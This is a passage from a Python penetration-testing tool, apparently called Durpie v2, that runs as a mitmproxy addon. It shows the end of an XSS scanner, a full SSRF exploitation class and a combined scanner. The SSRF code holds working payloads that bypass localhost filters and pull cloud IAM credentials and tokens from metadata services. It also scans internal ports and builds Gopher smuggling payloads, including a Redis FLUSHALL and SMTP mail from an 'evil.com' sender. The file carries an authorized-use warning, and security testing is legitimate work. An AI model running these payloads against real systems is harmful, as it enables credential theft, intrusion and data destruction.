                                       orig_body, content_type, req_headers)
            if not result or not result.ok:
                continue

            if self.XSS_MARKER in result.body and not self._is_encoded(result.body, payload):
                poc = self._generate_poc(url, param, location, payload, "bypass")
                return Finding(
                    type="Reflected XSS (Filter Bypass)",
                    severity=Severity.HIGH,
                    url=url,
                    detail=f"XSS payload reflected in '{param}' ({location}) "
                           f"using filter bypass technique.",
                    evidence=payload,
                    parameter=f"{location}:{param}",
                    payload=payload,
                    poc=poc,
                )

        # Reflected but filtered - still worth reporting
        if self.REFLECTION_CANARY in canary_result.body:
            return Finding(
                type="Potential XSS (Reflected Input, Filtered)",
                severity=Severity.LOW,
                url=url,
                detail=f"Input reflected in '{param}' ({location}) but appears to be filtered. "
                       f"Manual bypass testing recommended.",
                parameter=f"{location}:{param}",
                payload=self.REFLECTION_CANARY,
            )

        return None

    async def scan_url(self, url: str, method: str = "GET",
                       body: str = "", content_type: str = "",
                       headers: Dict = None) -> List[Finding]:
        """
        Scan a URL for XSS vulnerabilities.

        Args:
            url: Full URL with query parameters.
            method: HTTP method.
            body: Request body (POST).
            content_type: Content-Type header.
            headers: Request headers (e.g. session cookies).

        Returns:
            List of Finding objects.
        """
        findings = []
        req_headers = headers or {}
        if content_type:
            req_headers = {**req_headers, "Content-Type": content_type}

        params = _extract_params(url, body, content_type)
        if not params:
            self._log(f"No parameters found in {url}")
            return findings

        self._log(f"Testing {len(params)} parameters in {url} for XSS")

        tested = set()
        for location, param, _value in params:
            key = f"{location}:{param}"
            if key in tested:
                continue
            tested.add(key)

            self._log(f"  Testing {location}:{param}")
            finding = await self._test_reflection(
                method, url, location, param, body, content_type, req_headers
            )
            if finding:
                findings.append(finding)
                self._warn(str(finding))

        return findings

    # ---- mitmproxy addon hooks ----

    def response(self, flow: 'http.HTTPFlow'):
        """Intercept responses and queue endpoints for XSS testing."""
        if not flow.response:
            return

        content_type = flow.response.headers.get("content-type", "")
        if "text/html" not in content_type:
            return  # Only test HTML responses

        url = flow.request.pretty_url
        body = flow.request.get_text()
        req_ct = flow.request.headers.get("content-type", "")
        params = _extract_params(url, body, req_ct)
        if not params:
            return

        req_headers = dict(flow.request.headers)
        asyncio.ensure_future(self._addon_scan(url, flow.request.method, body,
                                               req_ct, req_headers))

    async def _addon_scan(self, url: str, method: str, body: str,
                          content_type: str, headers: Dict):
        findings = await self.scan_url(url, method, body, content_type, headers)
        for f in findings:
            self.findings.append(f)


# ============================================================
# SSRF EXPLOITER
# ============================================================

class SSRFExploiter:
    """
    Server-Side Request Forgery (SSRF) Exploitation Module.

    Why SSRF matters:
        SSRF forces the server to make HTTP requests to internal resources that
        the attacker cannot reach directly. This enables:
        - Cloud metadata theft (AWS keys, GCP tokens, Azure secrets)
        - Internal port scanning
        - Reading internal services (Redis, Elasticsearch, admin panels)
        - In severe cases, SSRF to RCE via Gopher protocol smuggling

    Detection strategy:
        1. Identify parameters that take URLs or hostnames
        2. Test localhost/127.0.0.1 variations to detect filter bypasses
        3. Test cloud metadata endpoints (AWS/GCP/Azure/Alibaba)
        4. Port scan internal hosts via the SSRF
        5. Generate Gopher/Dict protocol payloads for protocol smuggling

    Blind SSRF:
        If responses don't reflect content, use an external callback server
        (e.g. Burp Collaborator, interact.sh) to detect DNS/HTTP callbacks.
        Set callback_host to enable blind SSRF testing.
    """

    # Parameter names commonly used to pass URLs to the server
    URL_PARAM_NAMES = [
        "url", "uri", "path", "dest", "destination", "redirect",
        "return", "return_url", "next", "next_url", "target",
        "link", "feed", "feed_url", "host", "site", "from",
        "callback", "callback_url", "webhook", "webhook_url",
        "endpoint", "source", "src", "resource", "load",
        "image", "image_url", "img_url", "file", "document",
        "download", "fetch", "proxy", "goto", "to", "out",
    ]

    # Internal IP representations (filter bypass techniques)
    # Many SSRF filters block "127.0.0.1" but miss these equivalents
    LOCALHOST_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://0",
        "http://0177.0.0.1",          # octal
        "http://2130706433",           # decimal (0x7f000001)
        "http://0x7f.0x0.0x0.0x1",   # hex
        "http://127.0.0.1.xip.io",    # wildcard DNS
        "http://127.1",               # short form
        "http://127.0.1",
        "http://::ffff:127.0.0.1",    # IPv4-mapped IPv6
        "http://localhost.localdomain",
        "http://①②⑦.⓪.⓪.①",        # Unicode lookalikes (some parsers normalize these)
    ]

    # Cloud provider metadata endpoints
    CLOUD_METADATA_ENDPOINTS = {
        "aws": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://169.254.169.254/latest/meta-data/placement/availability-zone",
        ],
        "gcp": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        ],
        "azure": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        "alibaba": [
            "http://100.100.100.200/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        ],
        "do": [
            "http://169.254.169.254/metadata/v1/",
            "http://169.254.169.254/metadata/v1/id",
        ],
    }

    # Common internal ports to scan
    COMMON_PORTS = [
        21,    # FTP
        22,    # SSH
        23,    # Telnet
        25,    # SMTP
        80,    # HTTP
        443,   # HTTPS
        3306,  # MySQL
        5432,  # PostgreSQL
        6379,  # Redis
        8080,  # HTTP alt
        8443,  # HTTPS alt
        8888,  # Jupyter / misc
        9200,  # Elasticsearch
        27017, # MongoDB
        11211, # Memcached
    ]

    def __init__(self, client: HTTPClient = None, callback_host: str = ""):
        """
        Args:
            client: HTTPClient instance.
            callback_host: External callback hostname for blind SSRF testing.
                           Example: "your-id.oastify.com" (Burp Collaborator).
                           Leave empty to skip blind SSRF tests.
        """
        self.client = client or HTTPClient(timeout=8)
        self.callback_host = callback_host
        self.findings: List[Finding] = []

    def _log(self, msg: str):
        if MITMPROXY_AVAILABLE and ctx:
            ctx.log.info(f"[SSRF] {msg}")
        else:
            logger.info(f"[SSRF] {msg}")

    def _warn(self, msg: str):
        if MITMPROXY_AVAILABLE and ctx:
            ctx.log.warn(f"[SSRF] {msg}")
        else:
            logger.warning(f"[SSRF] {msg}")

    def _is_url_param(self, name: str, value: str) -> bool:
        """Check if a parameter is likely to accept a URL."""
        name_lower = name.lower()
        if any(kw in name_lower for kw in self.URL_PARAM_NAMES):
            return True
        if value and value.startswith(("http://", "https://", "//", "ftp://")):
            return True
        return False

    async def _probe_ssrf(self, method: str, url: str, location: str,
                          param: str, payload: str, orig_body: str,
                          content_type: str, req_headers: Dict) -> Optional[ProbeResult]:
        """Send a probe with the SSRF payload injected."""
        if location == "query":
            injected_url = _inject_query_param(url, param, payload)
            if method == "GET":
                return await self.client.get(injected_url, headers=req_headers)
            return await self.client.post(injected_url, data=orig_body or None,
                                          headers=req_headers)
        elif location == "form":
            injected = _inject_form_param(orig_body, param, payload)
            return await self.client.post(url, data=injected, headers=req_headers)
        elif location == "json":
            injected = _inject_json_param(orig_body, param, payload)
            return await self.client.post(url, json_data=json.loads(injected),
                                          headers=req_headers)
        return None

    def _response_suggests_ssrf(self, result: ProbeResult) -> Tuple[bool, str]:
        """
        Heuristically determine if the response indicates SSRF success.

        Returns (is_ssrf, evidence).
        """
        if not result.ok:
            return False, ""

        body = result.body
        indicators = []

        # AWS metadata response patterns
        if re.search(r"ami-id|instance-id|security-credentials|iam/", body, re.IGNORECASE):
            indicators.append("AWS metadata content detected")

        # GCP metadata patterns
        if re.search(r"computeMetadata|googleapis|gserviceaccount", body, re.IGNORECASE):
            indicators.append("GCP metadata content detected")

        # Azure metadata patterns
        if re.search(r'"azEnvironment"|"subscriptionId"', body, re.IGNORECASE):
            indicators.append("Azure metadata content detected")

        # Generic internal server indicators
        if re.search(r"127\.0\.0\.1|localhost|internal|intranet", body, re.IGNORECASE):
            indicators.append("Internal host reference in response")

        # Connection refused / timeout = server tried to connect (SSRF confirmed, target unreachable)
        if re.search(r"connection refused|ECONNREFUSED|No route to host|Network unreachable",
                     body, re.IGNORECASE):
            indicators.append("Server attempted connection to target (connection refused)")

        if indicators:
            return True, "; ".join(indicators)

        return False, ""

    async def _test_localhost(self, method: str, url: str, location: str,
                              param: str, orig_body: str, content_type: str,
                              req_headers: Dict, baseline: ProbeResult) -> Optional[Finding]:
        """Test for SSRF by sending localhost/127.0.0.1 variants."""
        for payload in self.LOCALHOST_PAYLOADS:
            result = await self._probe_ssrf(method, url, location, param, payload,
                                            orig_body, content_type, req_headers)
            if not result:
                continue

            is_ssrf, evidence = self._response_suggests_ssrf(result)

            # Also check for response length changes that might indicate SSRF
            if result.ok and baseline.ok:
                len_diff = abs(result.length - baseline.length)
                if len_diff > 200 and not is_ssrf:
                    # Significant response change may indicate the server made a request
                    is_ssrf = True
                    evidence = f"Response length changed significantly ({baseline.length} -> {result.length})"

            if is_ssrf:
                return Finding(
                    type="SSRF (Localhost Access)",
                    severity=Severity.HIGH,
                    url=url,
                    detail=f"SSRF in parameter '{param}' ({location}). "
                           f"Server appears to be making requests to internal hosts.",
                    evidence=evidence,
                    parameter=f"{location}:{param}",
                    payload=payload,
                    poc=(
                        f"# Test with cloud metadata:\n"
                        f"# Parameter: {param}\n"
                        f"# Payload: http://169.254.169.254/latest/meta-data/\n"
                        f"# For AWS IAM keys: "
                        f"http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                    ),
                )
        return None

    async def _test_cloud_metadata(self, method: str, url: str, location: str,
                                   param: str, orig_body: str, content_type: str,
                                   req_headers: Dict) -> List[Finding]:
        """
        Test for cloud metadata endpoint access via SSRF.

        Cloud metadata services run at 169.254.169.254 and expose:
        - AWS: IAM credentials, instance ID, user data (may contain secrets)
        - GCP: OAuth tokens, service account keys
        - Azure: Managed identity tokens, subscription info
        """
        findings = []

        # GCP requires a specific header
        gcp_headers = {**req_headers, "Metadata-Flavor": "Google"}
        # Azure requires metadata header
        azure_headers = {**req_headers, "Metadata": "true"}

        for provider, endpoints in self.CLOUD_METADATA_ENDPOINTS.items():
            for endpoint in endpoints:
                probe_headers = req_headers
                if provider == "gcp":
                    probe_headers = gcp_headers
                elif provider == "azure":
                    probe_headers = azure_headers

                result = await self._probe_ssrf(method, url, location, param, endpoint,
                                               orig_body, content_type, probe_headers)
                if not result or not result.ok:
                    continue

                is_ssrf, evidence = self._response_suggests_ssrf(result)

                # For cloud metadata, also check for typical JSON/text response shapes
                if not is_ssrf and result.status_code == 200 and result.length > 20:
                    # Unexpected successful response to a metadata URL is suspicious
                    is_ssrf = True
                    evidence = f"Server returned HTTP 200 for cloud metadata URL ({provider})"

                if is_ssrf:
                    severity = Severity.CRITICAL if "security-credentials" in endpoint or "token" in endpoint else Severity.HIGH
                    finding = Finding(
                        type=f"SSRF - {provider.upper()} Cloud Metadata Access",
                        severity=severity,
                        url=url,
                        detail=f"SSRF in parameter '{param}' ({location}) allows access to "
                               f"{provider.upper()} instance metadata. "
                               f"May expose cloud credentials and instance information.",
                        evidence=evidence,
                        parameter=f"{location}:{param}",
                        payload=endpoint,
                        poc=(
                            f"# {provider.upper()} metadata extraction via SSRF:\n"
                            f"# Set parameter '{param}' to:\n{endpoint}\n"
                        ),
                    )
                    findings.append(finding)
                    self._warn(str(finding))
                    break  # One confirmed finding per provider is enough

        return findings

    async def _test_port_scan(self, method: str, url: str, location: str,
                              param: str, orig_body: str, content_type: str,
                              req_headers: Dict) -> List[Finding]:
        """
        Internal port scanning via SSRF.

        By varying the port in the SSRF payload and comparing response times/content,
        we can determine which ports are open on the target server.

        Open port indicators:
        - Server returns content or a specific error (connection established)
        - Response is faster than a closed port (which times out)

        Closed port indicators:
        - Connection refused error quickly
        - Timeout (firewall dropping packet)
        """
        findings = []
        base_target = "http://127.0.0.1"
        open_ports = []

        for port in self.COMMON_PORTS:
            payload = f"{base_target}:{port}/"
            result = await self._probe_ssrf(method, url, location, param, payload,
                                            orig_body, content_type, req_headers)
            if not result:
                continue

            # Connection refused = port is reachable (closed) vs timeout (filtered)
            # A non-timeout response with content suggests the port is OPEN
            if result.ok and result.length > 0:
                open_ports.append(port)
                self._log(f"Port {port} appears OPEN on 127.0.0.1")
            elif "refused" in result.error.lower() or (
                result.ok and "connection refused" in result.body.lower()
            ):
                # Refused = host is reachable, port is closed. Still confirms SSRF.
                self._log(f"Port {port} connection refused (SSRF confirmed, port closed)")

        if open_ports:
            findings.append(Finding(
                type="SSRF - Internal Port Scan",
                severity=Severity.HIGH,
                url=url,
                detail=f"SSRF in parameter '{param}' ({location}) enables internal port scanning. "
                       f"Open ports detected on 127.0.0.1: {open_ports}",
                parameter=f"{location}:{param}",
                payload=f"http://127.0.0.1:{open_ports[0]}/",
                poc=(
                    f"# Detected open ports on 127.0.0.1: {open_ports}\n"
                    f"# Try accessing these services:\n"
                    f"# Redis (6379): http://127.0.0.1:6379/\n"
                    f"# Elasticsearch (9200): http://127.0.0.1:9200/_cat/indices"
                ),
            ))

        return findings

    def _generate_gopher_payload(self, host: str, port: int, data: str) -> str:
        """
        Generate a Gopher protocol payload for protocol smuggling.

        Gopher allows sending raw TCP data, enabling SSRF to interact with
        non-HTTP protocols like Redis, SMTP, Memcached, and MySQL.

        Example Redis attack:
        gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20key%20value%0D%0A

        The URL-encoded data is sent as raw bytes after the TCP connection is established.
        """
        encoded = urllib.parse.quote(data)
        return f"gopher://{host}:{port}/_{encoded}"

    def get_protocol_smuggling_payloads(self, target: str = "127.0.0.1") -> Dict[str, List[str]]:
        """
        Generate protocol smuggling payloads for common internal services.

        These payloads can be used when you have confirmed SSRF and want to
        interact with internal services that don't speak HTTP.
        """
        crlf = "%0D%0A"

        return {
            "redis_info": [
                self._generate_gopher_payload(target, 6379, f"*1{chr(13)}{chr(10)}$4{chr(13)}{chr(10)}INFO{chr(13)}{chr(10)}")
            ],
            "redis_flushall": [
                self._generate_gopher_payload(target, 6379, f"*1{chr(13)}{chr(10)}$8{chr(13)}{chr(10)}FLUSHALL{chr(13)}{chr(10)}")
            ],
            "smtp_send": [
                f"gopher://{target}:25/_EHLO%20attacker{crlf}MAIL%20FROM%3A%3Cattack%40evil.com%3E{crlf}RCPT%20TO%3A%3Cvictim%40target.com%3E{crlf}DATA{crlf}Subject%3A%20SSRF%20Test{crlf}{crlf}body{crlf}.{crlf}"
            ],
            "dict_ping": [
                f"dict://{target}:6379/info",
            ],
        }

    async def _test_blind_ssrf(self, method: str, url: str, location: str,
                               param: str, orig_body: str, content_type: str,
                               req_headers: Dict) -> Optional[Finding]:
        """
        Test for blind SSRF using an external callback host.

        If the server makes a request to the callback host, we can detect it
        via DNS resolution or HTTP callback even when the response doesn't
        include content from the SSRF target.

        Requires self.callback_host to be set (e.g. Burp Collaborator URL).
        """
        if not self.callback_host:
            return None

        import random
        unique_id = f"{random.randint(10000, 99999)}"
        callback_url = f"http://{unique_id}.{self.callback_host}/"

        result = await self._probe_ssrf(method, url, location, param, callback_url,
                                       orig_body, content_type, req_headers)
        if not result:
            return None

        # We can't know from the response alone if the callback was triggered.
        # Return an informational finding instructing the tester to check their callback server.
        return Finding(
            type="Potential Blind SSRF (Callback Sent)",
            severity=Severity.MEDIUM,
            url=url,
            detail=f"SSRF callback sent to {callback_url}. "
                   f"Check your callback server ({self.callback_host}) for DNS/HTTP requests. "
                   f"If a request was received, blind SSRF is confirmed.",
            parameter=f"{location}:{param}",
            payload=callback_url,
        )

    async def scan_url(self, url: str, method: str = "GET",
                       body: str = "", content_type: str = "",
                       headers: Dict = None) -> List[Finding]:
        """
        Scan a URL for SSRF vulnerabilities.

        Tests URL-accepting parameters with:
        1. Localhost/internal IP bypass payloads
        2. Cloud metadata endpoint access (AWS/GCP/Azure)
        3. Internal port scanning
        4. Blind SSRF via callback (if callback_host is configured)

        Args:
            url: Target URL.
            method: HTTP method.
            body: Request body.
            content_type: Content-Type header value.
            headers: Request headers.

        Returns:
            List of Finding objects.
        """
        findings = []
        req_headers = headers or {}
        if content_type:
            req_headers = {**req_headers, "Content-Type": content_type}

        params = _extract_params(url, body, content_type)
        if not params:
            self._log(f"No parameters found in {url}")
            return findings

        # Filter to URL-like parameters
        url_params = [(loc, name, val) for loc, name, val in params
                      if self._is_url_param(name, val)]

        if not url_params:
            self._log(f"No URL-accepting parameters detected in {url}")
            return findings

        self._log(f"Found {len(url_params)} potential SSRF vectors in {url}")

        # Baseline for comparison
        baseline = await self.client.get(url, headers=req_headers)

        for location, param, _value in url_params:
            self._log(f"  Testing SSRF on {location}:{param}")

            # 1. Localhost bypass payloads
            finding = await self._test_localhost(
                method, url, location, param, body, content_type, req_headers, baseline
            )
            if finding:
                findings.append(finding)
                self._warn(str(finding))

            # 2. Cloud metadata endpoints
            meta_findings = await self._test_cloud_metadata(
                method, url, location, param, body, content_type, req_headers
            )
            findings.extend(meta_findings)

            # 3. Internal port scan (only if SSRF already suspected)
            if finding or meta_findings:
                port_findings = await self._test_port_scan(
                    method, url, location, param, body, content_type, req_headers
                )
                findings.extend(port_findings)

            # 4. Blind SSRF via callback
            if self.callback_host:
                blind = await self._test_blind_ssrf(
                    method, url, location, param, body, content_type, req_headers
                )
                if blind:
                    findings.append(blind)

        return findings

    # ---- mitmproxy addon hooks ----

    def request(self, flow: 'http.HTTPFlow'):
        """Detect SSRF vectors in passing requests."""
        url = flow.request.pretty_url
        body = flow.request.get_text()
        content_type = flow.request.headers.get("content-type", "")
        params = _extract_params(url, body, content_type)

        for _loc, name, value in params:
            if self._is_url_param(name, value):
                self._log(f"Potential SSRF vector detected: {name}={value[:60]}")
                self.findings.append(Finding(
                    type="Potential SSRF Vector (Passive)",
                    severity=Severity.INFO,
                    url=url,
                    detail=f"Parameter '{name}' may accept URLs. Queue for active SSRF testing.",
                    parameter=name,
                    payload=value[:100],
                ))

    def response(self, flow: 'http.HTTPFlow'):
        """Queue interesting requests for active SSRF scanning."""
        if not flow.response:
            return

        url = flow.request.pretty_url
        body = flow.request.get_text()
        content_type = flow.request.headers.get("content-type", "")
        params = _extract_params(url, body, content_type)
        url_params = [(l, n, v) for l, n, v in params if self._is_url_param(n, v)]

        if url_params:
            req_headers = dict(flow.request.headers)
            asyncio.ensure_future(self._addon_scan(url, flow.request.method, body,
                                                   content_type, req_headers))

    async def _addon_scan(self, url: str, method: str, body: str,
                          content_type: str, headers: Dict):
        findings = await self.scan_url(url, method, body, content_type, headers)
        for f in findings:
            self.findings.append(f)


# ============================================================
# COMBINED ACTIVE SCANNER ADDON
# ============================================================

class ActiveScanner:
    """
    Combined active scanner addon.

    Runs all Phase 2 active scanners when loaded as a mitmproxy addon:
    - ActiveSQLiScanner
    - ActiveXSSScanner
    - SSRFExploiter

    Usage:
        mitmdump -s active_scanners.py

    Config (edit before use):
        - ACTIVE_SCAN_RATE_LIMIT : seconds between requests (default 0.2)
        - SSRF_CALLBACK_HOST     : external callback host for blind SSRF
    """

    ACTIVE_SCAN_RATE_LIMIT = 0.2  # seconds between requests
    SSRF_CALLBACK_HOST = ""        # e.g. "abc123.oastify.com"

    def __init__(self):
        client = HTTPClient(rate_limit=self.ACTIVE_SCAN_RATE_LIMIT)
        self.sqli = ActiveSQLiScanner(client=client)
        self.xss = ActiveXSSScanner(client=client)
        self.ssrf = SSRFExploiter(client=client, callback_host=self.SSRF_CALLBACK_HOST)
        self._scan_queue: asyncio.Queue = None
        self._worker_task = None
        self.all_findings: List[Finding] = []

    def running(self):
        """Called when mitmproxy is fully started."""
        self._scan_queue = asyncio.Queue()
        self._worker_task = asyncio.ensure_future(self._worker())
        if MITMPROXY_AVAILABLE and ctx:
            ctx.log.info("[ActiveScanner] Phase 2 active scanners initialized")
            ctx.log.info("[ActiveScanner] SQLi + XSS + SSRF scanning enabled")

    async def _worker(self):
        """Background worker that processes scan jobs."""
        while True:
            try:
                job = await asyncio.wait_for(self._scan_queue.get(), timeout=1.0)
            except asyncio.TimeoutError:
                continue
            except asyncio.CancelledError:
                break

            url, method, body, content_type, headers = job
            try:
                sqli_findings = await self.sqli.scan_url(url, method, body, content_type, headers)
                xss_findings = await self.xss.scan_url(url, method, body, content_type, headers)
                ssrf_findings = await self.ssrf.scan_url(url, method, body, content_type, headers)

                all_new = sqli_findings + xss_findings + ssrf_findings
                self.all_findings.extend(all_new)

                if all_new and MITMPROXY_AVAILABLE and ctx:
                    ctx.log.warn(f"[ActiveScanner] {len(all_new)} findings for {url}")
            except Exception as e:
                if MITMPROXY_AVAILABLE and ctx:
                    ctx.log.error(f"[ActiveScanner] Error scanning {url}: {e}")

    def response(self, flow: 'http.HTTPFlow'):
        """Queue each interesting request for active scanning."""
        if not flow.response:
            return
        if not self._scan_queue:
            return

        url = flow.request.pretty_url
        body = flow.request.get_text()
        content_type = flow.request.headers.get("content-type", "")
        params = _extract_params(url, body, content_type)

        if not params:
            return

        req_headers = dict(flow.request.headers)
        try:
            self._scan_queue.put_nowait(
                (url, flow.request.method, body, content_type, req_headers)
            )
        except asyncio.QueueFull:
            pass

    def done(self):
        """Export all findings when mitmproxy shuts down."""
        if self._worker_task:
            self._worker_task.cancel()

        if not self.all_findings:
            return

        output = [f.to_dict() for f in self.all_findings]
        filename = f"durpie_active_findings_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(filename, "w") as fh:
                json.dump(output, fh, indent=2)
            if MITMPROXY_AVAILABLE and ctx:
                ctx.log.info(f"[ActiveScanner] {len(output)} findings saved to {filename}")
            else:
                print(f"[ActiveScanner] {len(output)} findings saved to {filename}")
        except OSError as e:
            print(f"[ActiveScanner] Failed to save findings: {e}")


# ============================================================
# MITMPROXY ADDONS LIST
# ============================================================

addons = [
    ActiveScanner(),
]


# ============================================================
# STANDALONE DEMO / SELF-TEST
# ============================================================

if __name__ == "__main__":
    import sys

    print("""
Durpie v2 - Active Scanners (Phase 2)
======================================
Available scanners:
  - ActiveSQLiScanner  : Error-based, boolean-blind, time-based, UNION SQLi
  - ActiveXSSScanner   : Context-aware XSS with PoC generation
  - SSRFExploiter      : Localhost bypass, cloud metadata, port scan, protocol smuggling

Usage as mitmproxy addon:
  mitmdump -s active_scanners.py

Standalone scan example:
  python active_scanners.py https://target.com/search?q=test

WARNING: Only use against authorized targets.
""")

    if len(sys.argv) > 1:
        target_url = sys.argv[1]

        async def _demo():
            print(f"[*] Starting active scan of: {target_url}")
            client = HTTPClient(timeout=15, rate_limit=0.3)

            print("[*] Running SQLi scanner...")
            sqli = ActiveSQLiScanner(client=client)
            sqli_findings = await sqli.scan_url(target_url)

            print("[*] Running XSS scanner...")
            xss = ActiveXSSScanner(client=client)
            xss_findings = await xss.scan_url(target_url)

            print("[*] Running SSRF scanner...")
            ssrf = SSRFExploiter(client=client)
            ssrf_findings = await ssrf.scan_url(target_url)

            all_findings = sqli_findings + xss_findings + ssrf_findings
            print(f"\n[+] Scan complete. {len(all_findings)} findings:\n")
            for f in all_findings:
                print(f"  {f}")

        asyncio.run(_demo())
